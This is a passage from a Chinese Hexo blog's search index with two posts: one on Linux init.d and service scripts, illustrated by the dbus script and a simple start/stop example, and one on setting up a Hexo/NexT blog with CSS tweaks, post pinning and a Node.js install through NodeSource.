class="variable">$PIDFILE</span> \</span><br><span class="line">    --user <span class="variable">$DAEMONUSER</span></span><br><span class="line"><span class="comment"># We no longer include these arguments so that start-stop-daemon</span></span><br><span class="line"><span class="comment"># can do its job even given that we may have been upgraded.</span></span><br><span class="line"><span class="comment"># We rely on the pidfile being sanely managed</span></span><br><span class="line"><span class="comment"># --exec $DAEMON -- --system $PARAMS</span></span><br><span class="line">log_end_msg $?</span><br><span class="line">rm -f <span class="variable">$PIDFILE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reload_it()</span><br><span class="line">&#123;</span><br><span class="line">create_machineid</span><br><span class="line">log_action_begin_msg <span class="string">&quot;Reloading <span class="variable">$DESC</span> config&quot;</span></span><br><span class="line">dbus-send --print-reply --system --<span class="built_in">type</span>=method_call \</span><br><span class="line">            --dest=org.freedesktop.DBus \</span><br><span class="line">            / org.freedesktop.DBus.ReloadConfig &gt; /dev/null</span><br><span class="line"><span class="comment"># hopefully this is enough time for dbus to reload it&#x27;s config file.</span></span><br><span class="line">log_action_end_msg $?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line">    start_it_up</span><br><span class="line">;;</span><br><span class="line">stop)</span><br><span class="line">    shut_it_down</span><br><span class="line">;;</span><br><span class="line">reload|force-reload)</span><br><span class="line">    reload_it</span><br><span class="line">;;</span><br><span class="line">restart)</span><br><span class="line">    shut_it_down</span><br><span class="line">    start_it_up</span><br><span class="line">;;</span><br><span class="line">status)</span><br><span class="line">    status_of_proc -p <span class="variable">$PIDFILE</span> <span class="variable">$DAEMON</span> <span class="variable">$NAME</span> &amp;&amp; <span class="built_in">exit</span> 0 || <span class="built_in">exit</span> $?</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: /etc/init.d/<span class="variable">$NAME</span> &#123;start|stop|reload|restart|force-reload|status&#125;&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 2</span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<p> 说明：实际上dbus的service，就是一个.sh脚本，如果有C或者sh的基础就很好弄懂是什么意思，比如<code>service dbus start</code>，service进程就会从<code>/etc/init.d/</code>目录下找到dbus这个服务，这个sh脚本的<code>case</code>参数传入<code>start</code>，调用具体的实现逻辑。</p>
<p> 再举一个简单点的例子，和实际用法。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SERVERNAME= <span class="string">&quot;DemonShell&quot;</span></span><br><span class="line"></span><br><span class="line">start()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span>  <span class="string">&quot;start <span class="variable">$SERVERNAME</span>&quot;</span></span><br><span class="line">    /home/mecry/DemonShell</span><br><span class="line">    <span class="built_in">echo</span>  <span class="string">&quot;start <span class="variable">$SERVERNAME</span> ok!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span>  0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span>  <span class="string">&quot;stop <span class="variable">$SERVERNAME</span>&quot;</span></span><br><span class="line">    killall <span class="variable">$SERVERNAME</span></span><br><span class="line">    <span class="built_in">echo</span>  <span class="string">&quot;stop <span class="variable">$SERVERNAME</span> ok!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span>  <span class="string">&quot;<span class="variable">$1</span>&quot;</span>  <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line">    start</span><br><span class="line">    ;;</span><br><span class="line">stop)</span><br><span class="line">    stop</span><br><span class="line">    ;;</span><br><span class="line">restart)</span><br><span class="line">    stop</span><br><span class="line">    start</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    <span class="built_in">echo</span>  <span class="string">&quot;usage: <span class="variable">$0</span> start|stop|restart&quot;</span></span><br><span class="line">    <span class="built_in">exit</span>  0;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p> 和上面的systemctl一样，<code>/home/mecry/DemonShell</code>是我脚本存放位置，开机控制其启动，调用service也可以控制启动和关闭此脚本，非常方便。</p>
</li>
</ol>
<h2 id="systemctl和service优点缺点"><a href="#systemctl和service优点缺点" class="headerlink" title="systemctl和service优点缺点"></a>systemctl和service优点缺点</h2><pre><code>建议使用systemctl，比较规范方便
</code></pre>
]]></content>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【问题解决】博客搭建</title>
    <url>/2021/04/20/blog%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="blog的搭建"><a href="#blog的搭建" class="headerlink" title="blog的搭建"></a>blog的搭建</h1><p><em><strong>此博客是github，用hexo，并用使用next主题进行配置和搭建。</strong></em></p>
<span id="more"></span>

<p><strong>吐槽一下，作为一名纯种的后端搭建blog，尽管网上有说明，但是还是觉得有些许吃力。特别是我换顶部图片，简直是我一步一步试出来的</strong></p>
<p>搭建步骤</p>
<ul>
<li>注册一个github，并且新建一个名字一样的github仓库</li>
<li>配置本地的hexo环境</li>
<li>下载next主题</li>
<li>直接在<code>_posts</code>下开始写博客</li>
<li>大功告成</li>
</ul>
<p>注意：</p>
<h4 id="问题1：背景图片更换"><a href="#问题1：背景图片更换" class="headerlink" title="问题1：背景图片更换"></a>问题1：背景图片更换</h4><p>解决：在<code>main.styl</code>加入<code>@import &quot;_custom/styles.styl&quot;</code>，背景图片放在<code>themes\next\source\images</code>文件夹中，本地创建<code>themes\next\source\css\ _custom\style.styl</code>文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">background: url(<span class="regexp">/images/</span>图片名);</span><br><span class="line">background-repeat: no-repeat;<span class="comment">// 设定背景图片非重复填充</span></span><br><span class="line">background-attachment: fixed;<span class="comment">// 设置背景图片不随页面滚动</span></span><br><span class="line">background-position: <span class="number">50</span>% <span class="number">50</span>%;<span class="comment">// 设置背景图片位置</span></span><br><span class="line">background-size: cover<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="问题2：顶部图片更换"><a href="#问题2：顶部图片更换" class="headerlink" title="问题2：顶部图片更换"></a>问题2：顶部图片更换</h4><p>解决：在<code>headerband.styl</code>中插入下面那句话，背景图片放在站点的source/image下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">.headband &#123;</span><br><span class="line">  <span class="comment">//background: $headband-bg;</span></span><br><span class="line">    background: url(<span class="string">&#x27;../../image/header-bg.jpg&#x27;</span>);</span><br><span class="line">  height: 180px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="问题3：文章置顶"><a href="#问题3：文章置顶" class="headerlink" title="问题3：文章置顶"></a>问题3：文章置顶</h4><p>解决：直接复制替换node_modules/hexo-generator-index/lib/generator.js的内容</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pagination = <span class="built_in">require</span>(<span class="string">&#x27;hexo-pagination&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">locals</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = <span class="built_in">this</span>.config;</span><br><span class="line">  <span class="keyword">var</span> posts = locals.posts.sort(config.index_generator.order_by);</span><br><span class="line"></span><br><span class="line">  posts.data = posts.data.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(a.top &amp;&amp; b.top) &#123;</span><br><span class="line">          <span class="keyword">if</span>(a.top == b.top) <span class="keyword">return</span> b.date - a.date;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">return</span> b.top - a.top;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(a.top &amp;&amp; !b.top) &#123;</span><br><span class="line">          <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(!a.top &amp;&amp; b.top) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">return</span> b.date - a.date;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> paginationDir = config.pagination_dir || <span class="string">&#x27;page&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> pagination(<span class="string">&#x27;&#x27;</span>, posts, &#123;</span><br><span class="line">    perPage: config.index_generator.per_page,</span><br><span class="line">    layout: [<span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;archive&#x27;</span>],</span><br><span class="line">    format: paginationDir + <span class="string">&#x27;/%d/&#x27;</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      __index: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>配置插件</p>
<p>$ npm uninstall hexo-generator-index –save</p>
<p>$ npm install hexo-generator-index-pin-top –save</p>
<p>然后在需要置顶的文章的Front-matter中加上top: true或者top数字top: 1：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">title: 置顶</span><br><span class="line">date: <span class="number">2019</span>-<span class="number">09</span>-<span class="number">09</span> <span class="number">09</span>:<span class="number">09</span>:<span class="number">09</span></span><br><span class="line">top: <span class="literal">true</span></span><br><span class="line">top: <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>按照数字大小依次往下置顶排序</p>
<h4 id="问题4：博客提交"><a href="#问题4：博客提交" class="headerlink" title="问题4：博客提交"></a>问题4：博客提交</h4><p>解决：调用<code>blog_push.sh</code>是提交，<code>blog_localtest.sh</code>是在本地查看</p>
<h4 id="问题5：blog文章中图片添加"><a href="#问题5：blog文章中图片添加" class="headerlink" title="问题5：blog文章中图片添加"></a>问题5：blog文章中图片添加</h4><p>解决：在<code>_post</code>目录下创建一个同名文件夹，放图片，在文章中插入<code>![图1](1.png)</code>。</p>
<h4 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h4><ol>
<li>Node.js 安装，node在debian仓库只有10版本，hexo需要12以上参考<a href="https://github.com/nodesource/distributions/issues/1099">解决方案</a>,安装时必须在梯子环境下<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -sL https:&#x2F;&#x2F;deb.nodesource.com&#x2F;setup_lts.x -o nodesource_setup.sh</span><br><span class="line">#将nodesource_setup.sh中 DISTRO&#x3D;$(lsb_release -c -s) 修改为 DISTRO&#x3D;stable</span><br><span class="line">sudo bash nodesource_setup.sh</span><br><span class="line">sudo apt-get install -y nodejs</span><br><span class="line">node -v</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="问题4：添加全屏背景并文章透明"><a href="#问题4：添加全屏背景并文章透明" class="headerlink" title="问题4：添加全屏背景并文章透明"></a>问题4：添加全屏背景并文章透明</h4><ol>
<li>在<code>hexo/source/images</code>下增加图片<code>background.jpg</code></li>
<li>在 <code>hexo/themes/hexo-theme-next/source/_data</code>下新建<code>styles.styl</code>文件，文件内容为<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">    background:url(&#x2F;images&#x2F;background.jpg);</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment:fixed;</span><br><span class="line">    background-position:50% 50%;</span><br><span class="line">    &#x2F;&#x2F; background-size: 100% 100%;</span><br><span class="line">    background-size: cover;</span><br><span class="line">    -webkit-background-size: cover;</span><br><span class="line">    -o-background-size: cover;</span><br><span class="line">    -moz-background-size: cover;</span><br><span class="line">    -ms-background-size: cover;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;博客内容透明化</span><br><span class="line">&#x2F;&#x2F;文章内容的透明度设置</span><br><span class="line">.content-wrap &#123;</span><br><span class="line">  opacity: 0.8;</span><br><span class="line">&#125;</span><br><span class="line">.main-inner &#123; </span><br><span class="line">   &#x2F;&#x2F; margin-top: 60px;</span><br><span class="line">   &#x2F;&#x2F; padding: 60px 60px 60px 60px;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;opacity: 0.8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;菜单栏的透明度设置</span><br><span class="line">.header-inner &#123;</span><br><span class="line">  background: rgba(255,255,255,0.8);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;搜索框（local-search）的透明度设置</span><br><span class="line">.popup &#123;</span><br><span class="line">  opacity: 0.8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.post-block &#123;</span><br><span class="line">    background: rgba(255,255,255,0.7) none repeat scroll !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.sidebar-inner &#123;</span><br><span class="line">  background: rgba(255,255,255,0.7) none repeat scroll !important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
</search>
